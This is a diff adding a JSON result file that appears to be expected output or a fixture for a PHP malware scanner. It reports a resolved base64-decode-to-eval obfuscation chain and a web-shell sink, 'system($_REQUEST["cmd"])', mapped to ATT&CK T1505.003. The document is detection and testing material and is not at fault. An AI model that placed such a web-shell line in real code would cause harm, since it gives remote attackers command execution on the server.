@@ -1,0 +1,90 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 1100,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "eval(...) via base64_decode",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 300,
+          "score_map": {},
+          "signatures": {
+            "literal_decode_chain": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Obfuscated eval/assert/create_function chain resolved",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "system($_REQUEST[\"cmd\"])",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 800,
+          "score_map": {},
+          "signatures": {
+            "system": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Dangerous sink directly reachable from user input",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "f309d6b31b1d055142feb171f94e4c51f7842ff8ae36ee88c42cd758bccfee8c_layer0_decoded.php",
+        "sha256": "470cbe3ed5bcd281ca412e64ccb68b579c1beb44aa051ff51b1e4bc76d720b2e"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "phpsim_findings_log.json",
+        "sha256": "8205e2e08539b77ca43fa7858f7c52ca71f32c7b62261b21a07b1da2f5584ec2"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [
+          "T1505.003"
+        ],
+        "heur_id": 1,
+        "signatures": [
+          "system"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "literal_decode_chain"
+        ]
+      }
+    ],
+    "tags": {},
+    "temp_submission_data": {}
+  }
+}
